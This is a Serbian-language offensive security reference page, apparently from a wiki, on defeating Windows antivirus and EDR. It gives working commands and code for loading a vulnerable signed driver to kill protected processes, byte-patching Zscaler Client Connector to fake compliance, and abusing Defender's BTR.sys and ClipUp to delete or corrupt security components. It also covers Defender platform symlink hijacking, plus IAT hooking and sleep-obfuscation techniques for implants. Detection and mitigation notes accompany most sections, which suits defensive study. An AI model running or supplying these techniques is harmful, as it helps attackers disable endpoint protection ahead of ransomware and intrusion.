Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre instaliranja ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* drajver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje ne mogu da blokiraju čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključne napomene
1. **Potpisani drajver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani drajver `AToolsKrnl64.sys` iz „System In-Depth Analysis Toolkit“ kompanije Antiy Labs. Pošto drajver ima važeći Microsoft potpis, učitava se čak i kada je omogućena funkcija Driver-Signature-Enforcement (DSE).
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces prema PID-u (koristi se za zaustavljanje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti drajver i servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za hardening.

Otkrivanje / ublažavanje
• Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbijao da učita `AToolsKrnl64.sys`.
• Pratite kreiranje novih *kernel* servisa i upozorite kada se drajver učita iz world-writable direktorijuma ili nije na allow-listi.
• Pratite user-mode handle-ove ka prilagođenim objektima uređaja, a zatim sumnjive pozive `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provera stanja uređaja patchovanjem binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila za proveru stanja uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja obavlja se **u potpunosti na klijentskoj strani** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Patchovanjem četiri potpisane binarne datoteke na disku** oba mehanizma mogu da se neutrališu:

| Binarna datoteka | Originalna logika koja se patchuje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektan poziv funkcije `WinVerifyTrust` | Zamenjen NOP instrukcijama ⇒ bilo koji proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobiđene |

Minimalni izvod patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju koje se donose isključivo na klijentskoj strani i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba pouzdanih funkcionalnosti Microsoft Defender `BTR.sys`

Defenderov drajver **Boot-Time Removal** koristan je primer koji se razlikuje od klasičnog BYOVD-a. `BTR.sys` je legitimna Microsoftova komponenta za sanaciju, potpisana bezbednosnim potpisom, bez greške u memoriji i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater umesto toga može da falsifikuje njegovu privatnu transakciju za sanaciju i dobije predviđene Ring-0 operacije nad datotekama/registrima. Ovo je **primitiva za neutralizaciju AV/EDR-a nakon kompromitacije, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopstvenom `MpEngine.dll` fajlu mete, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično izdvaja resurs kao nasumično imenovanu datoteku `[a-z]{8}.sys` i registruje kernel servis sa sličnim imenom. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i proverava listu radnji, upisuje povratne informacije i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršavanja, čímu se drajver isključuje umesto da ostane rezidentен. Фалсификовани сервис има следеће карактеристичне вредности.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan RC4-šifrovan blob. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, pa šifrovanje nije granica autorizacije. Ispravan otvoreni tekst ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz payload-a), zatim putanju za feedback u UTF-16 formatu, završenu nulom, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svako zaglavlje i svaki region podataka proveravaju se nezavisno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija izlažu ove primitive kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 putanja]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 putanja]` | Uklanjanje praznog direktorijuma |
| 3 | `[Zastavice][izvor][odredište]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Zastavice][putanja ključa]` | Rekurzivno brisanje ključa registratora |
| 5 | `[Zastavice][putanja ključa + "\\" + vrednost]` | Brisanje vrednosti registratora |
| 6 | `[Zastavice][tip][veličina][putanja ključa + "\\" + vrednost][podaci]` | Kreiranje/ažuriranje vrednosti registratora i kreiranje nedostajućih putanja ključeva |

Kod akcija 5 i 6, separator ključa/vrednosti u serijalizovanom formatu čine **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti ispravno razdvojena. Feedback datoteka uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje zastavica, BTR pomera putanju u četiri rezervisana završna bajta da bi napravio mesto za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i period ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira ceo lanac: izvlači `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i feedback stream, serijalizuje, izračunava kontrolne sume i šifruje ulančane akcije, direktno kreira servisni ključ registratora, a zatim poziva `NtLoadDriver` za `-trigger now` или оставља драјвер да се покрене при покретању система уз `-trigger boot`. Директно постављање у регистратор заобилази уобичајени SCM `CreateServiceW` пут и зато **не генерише догађај инсталације сервиса Event ID 7045**. Артефакти покренути при покретању система могу се касније уклонити помоћу `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` postanu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga izvršava se u Phase 1: NTFS je upotrebljiv, ali mnogi bezbednosni drajveri koji se pokreću pri startu sistema i EDR servisi u user-mode režimu još se nisu inicijalizovali. Filteri koji se pokreću pri startu, kao što je `WdFilter`, možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i da izbriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon provere pri pokretanju sistema i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji izvršava se u jednoj transakciji. PoC dodaje Action 1 na početak za unapred definisanu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre nego što se učita. Time se smanjuje broj tragova, dok čuvanje povratnih informacija u `<random>.sys:<random>.dat` omogućava istovremeno uklanjanje drajvera i oba stream-a.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Prednost dajte sledećim bihevioralnim korelacijama, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** kreiranje `.sys:changelist` univerzalno je za BTR staging. ADS `.dat` pridružen istoj `.sys` datoteci posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući SCM događaj instalacije.
- **Sysmon 6 -> 23:** korelišite učitavanje poznatog BTR drajvera iz porekla koje nije Defender sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** upozoravajte na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada drajver bezbednosnog alata postavi `cmd.exe`, PowerShell ili nepoznat proces.

## Zloupotreba Protected Process Light (PPL) za menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. Sa ofanzivne strane, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. beleženje) u ograničeni primitiv za upis, zaštićen PPL-om, koji deluje na zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokretao kao PPL
- Ciljna EXE datoteka (i sve učitane DLL datoteke) mora biti potpisana EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess i sledećih zastavica: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi dovešće do neuspešnog kreiranja.

Ovde pogledajte i širi uvod u PP/PPL i zaštitu LSASS-a:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnoj EXE datoteci):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac upotrebe:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sam sebe i prihvata parametar za upisivanje log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se obavlja uz podršku PPL-a.
- ClipUp ne može da obradi putanje koje sadrže razmake; koristite 8.3 kratke putanje za pristup uobičajeno zaštićenim lokacijama.

Pomoćne alatke za 8.3 kratke putanje
- Izlistajte kratka imena: `dir /x` u svakom roditeljskom direktorijumu.
- Izvedite kratku putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-sposoban LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste prinudno kreirali fajl u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite 8.3 kratka imena.
3) Ako AV obično drži ciljnu binarnu datoteku otvorenom/zaključanom dok radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre nego što AV стартује, tako što ćete instalirati uslugu sa automatskim pokretanjem koja se pouzdano pokreće раније. Proverite redosled покретања уз Process Monitor (boot logging).
4) При поновном покретању, уписивање уз подршку PPL-а одвија се пре него што AV закључа своје бинарне датотеке, оштећује циљну датотеку и спречава покретање.

Пример покретања (путање су изостављене/скраћене ради безбедности):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo mesto upisa; ova primitiva je pogodna za oštećivanje, a ne za precizno ubacivanje sadržaja.
- Potrebna su lokalna administratorska/SYSTEM ovlašćenja za instaliranje/pokretanje usluge i period za ponovno pokretanje.
- Vreme izvršavanja je ključno: ciljna datoteka ne sme da bude otvorena; izvršavanje pri pokretanju izbegava zaključavanje datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni pokretači, u vreme pokretanja sistema.
- Nove usluge konfigurisane da automatski pokreću sumnjive binarne datoteke i dosledno se pokreću pre Defender/AV. Istražite kreiranje/izmenu usluga pre neuspeha pri pokretanju Defendera.
- Praćenje integriteta datoteka Defendera/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama zaštićenog procesa.
- ETW/EDR telemetrija: potražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i neuobičajenu upotrebu PPL nivoa kod binarnih datoteka koje nisu AV.

Mere ublažavanja
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pozivanje ClipUp-a van legitimnog konteksta.
- Higijena usluga: ograničite kreiranje/izmenu usluga koje se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su omogućeni Defender tamper protection i zaštite pri ranom pokretanju; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih imena 8.3 na diskovima koji sadrže bezbednosne alate, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Neovlašćeno menjanje Microsoft Defendera putem otmice simboličke veze do fascikle Platform Version

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa najvišim leksikografskim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese usluge Defender (u skladu s tim ažurirajući putanje usluge/registra). Ovaj izbor veruje unosima direktorijuma, uključujući tačke ponovne analize direktorijuma (simboličke veze). Administrator to može da iskoristi za preusmeravanje Defendera na putanju u koju napadač može da upisuje i postizanje DLL sideloading-a ili ometanja rada usluge.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni administrator (potrebno za kreiranje direktorijuma/simboličkih veza u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora platforme Defendera (ponovno pokretanje usluge pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u svoje fascikle, ali njegov izbor platforme veruje unosima direktorijuma i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite upisivu kopiju trenutne fascikle platforme, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte simboličku vezu ka direktorijumu sa višom verzijom unutar direktorijuma Platform koja pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) izvršava iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa u `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Ubacite/zamenite DLL-ove koje Defender učitava iz direktorijuma svoje aplikacije da biste izvršili kod u Defenderovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zaustavljanje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing uz PIC (Crystal Kit-style)

Red timovi mogu da izmeste runtime evaziju iz C2 implant-a u sam ciljni modul tako što će postaviti hook na njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz position-independent code (PIC) pod kontrolom napadača. Time se evazija proširuje izvan malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA), a ista zaštita se omogućava i za BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Učitajte PIC blob uz ciljni modul pomoću reflective loader-a (kao prefiks ili prateću komponentu). PIC mora biti samostalan i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evazije pre nego što pozove stvarnu API adresu pomoću tail-call-a. Tipične evazije obuhvataju:
  - Maskiranje/demaskiranje memorije oko poziva (npr. šifrovanje beacon region-a, RWX→RX, promena naziva/dozvola stranica), pa vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite benigni stack i pređite u ciljnu API funkciju tako da analiza call-stack-a utvrdi očekivane frame-ove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izložite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je za hookovanje u Beacon-u, BOF-ovima i post-ex DLL-ovima.

Zašto ovde koristiti IAT hooking
- Radi sa svakim kodom koji koristi import sa postavljenim hook-om, bez menjanja koda alata ili oslanjanja na Beacon da posreduje u pozivima određenih API-ja.
- Pokriva post-ex DLL-ove: hookovanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/izbegavanja analize stack-a na njihove API pozive.
- Omogućava pouzdano korišćenje post-ex komandi koje pokreću procese, a koje ciljaju detekcije zasnovane na call-stack-u, tako što se CreateProcessA/W pozivi obaviju wrapper-ima.

Osnovni prikaz IAT hook-a (pseudokod za x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni zakrpu nakon relokacija/ASLR-a, a pre prve upotrebe importa. Reflective loader-i poput TitanLdr/AceLdr pokazuju kako se hooking obavlja tokom DllMain-a učitanog modula.
- Wrapper-e drži malim i PIC-safe; pravu API funkciju razreši preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Za PIC koristi prelaze RW → RX i izbegavaj da stranice ostanu i upisive i izvršne.

Call-stack spoofing stub
- PIC stub-ovi u Draugr stilu formiraju lažni lanac poziva (povratne adrese unutar benignih modula), a zatim prebacuju izvršavanje na pravu API funkciju.
- Ovo zaobilazi detekcije koje očekuju kanonske stekove od Beacon/BOF-ova pri pozivima osetljivih API-ja.
- Kombinuj sa tehnikama stack cutting/stack stitching da bi se izvršavanje smestilo u očekivane frejmove pre prologa API-ja.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova kako bi se PIC i hook-ovi automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu za registrovanje ciljnih API-ja kako bi Beacon i BOF-ovi transparentno koristili isti put za evaziju bez izmena koda.

Razmatranja za detekciju/DFIR
- Integritet IAT-a: unosi koji pokazuju na adrese koje nisu deo image-a (heap/anon); periodična provera import pokazivača.
- Anomalije steka: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na ne-image PIC; nedosledno poreklo RtlUserThreadStart.
- Telemetrija loader-a: upisi u IAT unutar procesa, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX region-i kreirani pri učitavanju.
- Izbegavanje image-load detekcije: ako se hook-uje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assembly-ja povezana sa događajima maskiranja memorije.

Povezani gradivni elementi i primeri
- Reflective loader-i koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Hook-ovi za maskiranje memorije (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC stub-ovi za call-stack spoofing (npr. Draugr)


## IAT Hooking pri učitavanju + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hook-ovi pri učitavanju preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač loader-a na `GetProcAddress` zameniti prilagođenim resolver-om koji prvo proverava hook-ove:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (trajan PIC objekat) koji opstaje nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja menja import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi pretragu hook-ova zasnovanu na hash-u, poput `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj ciljne hook-ove pri linkovanju pomoću unosa Crystal Palace `addhook "MODULE$Func" "hook"`. Hook ostaje važeći jer se nalazi unutar rezidentnog PICO-a.

Tako se dobija **IAT redirekcija pri učitavanju** bez naknadnog patchovanja sekcije koda učitanog DLL-a.

### Nametanje hookable importa kada cilj koristi PEB-walking

Hook-ovi pri učitavanju se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API-je pomoću PEB-walk + hash-a (bez import unosa), nametni pravi import kako bi putanja `ProcessImports()` u loader-u mogla da ga obradi:

- Zameni razrešavanje export-a pomoću hash-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom poput `&WaitForSingleObject`.
- Kompajler će emitovati IAT unos, što omogućava presretanje pri razrešavanju importa od strane reflective loader-a.

### Ekahovo sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kod dugих čekanja obmotaj poziv Ekko-stilom maskiranja koji šifruje image u memoriji tokom mirovanja:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakaže niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frejmovima.
- Uobičajen lanac (x64): postavi image na `PAGE_READWRITE` → RC4 šifrovanje preko `advapi32!SystemFunction032` nad celim mapiranim image-om → izvrši blokirajuće čekanje → RC4 dešifrovanje → **vrati dozvole za svaku sekciju** prolaskom kroz PE sekcije → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frejmova i podesi registre (`Rip/Rcx/Rdx/R8/R9`) da pozovu svaki korak.

Operativni detalj: za duga čekanja vrati „success“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda mirovanja i izbegava prepoznatljiv potpis klasičnog „patchovanog `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi `CreateTimerQueueTimer` callback-ova koji pokazuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, kontinuiranim baferima veličine image-a.
- `VirtualProtect` nad velikim opsegom, nakon čega sledi prilagođeno vraćanje dozvola za svaku sekciju.

### Runtime CFG registracija za sleep-obfuscation gadget-e

Na CFG-omogućenim ciljevima, prvi indirektni skok na mid-function gadget, poput `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi lanci u Ekko/Kraken stilu funkcionisali u ojačanim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje lanac koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje od **osnove image-a** i da obuhvati **punu veličinu image-a**.
- Za ručno mapirane/PIC/stomped regione koristi **osnovu alokacije** i veličinu alokacije.
- Obeleži ne samo dispatch gadget, već i indirektno dosegnute export-e (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ove), kao i sve izvršne sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Time se ROP/JOP-style sleep lanci, koji su ranije „radili samo u procesima bez CFG-a“, pretvaraju u ponovo upotrebljiv primitiv za `explorer.exe`, pregledače, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a je upadljiva i može da izazove probleme na CET Shadow Stack sistemima, jer spoofovani `Rip` i dalje mora da odgovara hardverskom shadow stack-u. Bezbedniji obrazac za sleep-masking je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i preko `NtQueryInformationThread` pročitaj granice steka (`StackBase`, `StackLimit`) iz njegovog `NT_TIB` / TEB-a.
- Napravi rezervnu kopiju pravog TEB/TIB-a trenutnog thread-a.
- Sačuvaj stvarni kontekst uspavanog thread-a pomoću `GetThreadContext`.
- Kopiraj **samo** stvarni `Rip` u spoof kontekst, a spoofovani `Rsp`/stanje steka ostavi netaknutim.
